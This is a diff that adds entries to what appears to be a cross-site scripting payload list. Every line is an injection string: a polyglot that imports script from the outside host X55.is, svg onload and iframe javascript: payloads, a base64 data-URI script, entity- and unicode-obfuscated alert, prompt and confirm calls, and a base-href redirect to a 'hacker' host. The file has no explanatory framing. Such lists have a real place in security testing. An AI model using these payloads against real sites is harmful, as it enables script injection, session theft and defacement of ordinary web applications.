@@ -1,5 +1,15 @@
 JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\http://X55.is/.source))}//\76-->
 'Src="//X55.is/>?<Script/K='
+?msg=%3Csvg%2Fonload%3Dalert%28%22XSS%22%29%20%3E, <svg/onload=alert("XSS") >
+?utm_source=abc%60%3breturn+false%7d%29%3b%7d%29%3balert%60xss%60;%3c%2f%73%63%72%69%70%74%3e
+<a+HREF="%26%237 javascrip%26%239t: alert%261par;document .domain) *>
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a>
+<script /***/>/***/confirm('\uFF41\uFF4C\uFF45\uFF52\uFF54\u1455\uFF11\u1450')/***/</script /***/
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+<svg> <foreignObject width="100%" height="100%">     <body> <iframe src='javascript:confirm(10)'></iframe>     </body>   </foreignObject> </svg>
+<script>var a=document.createElement("a");a.href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==";http://a.click/();</script> ( Encoded by chatGPT )
+jaVasCript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+"'alert(1)
 <script>alert(0)</script>
 "><base href=//hacker>|
 <A %252F=""Href= JavaScript:k='a',top[k%2B'lert'](1)>
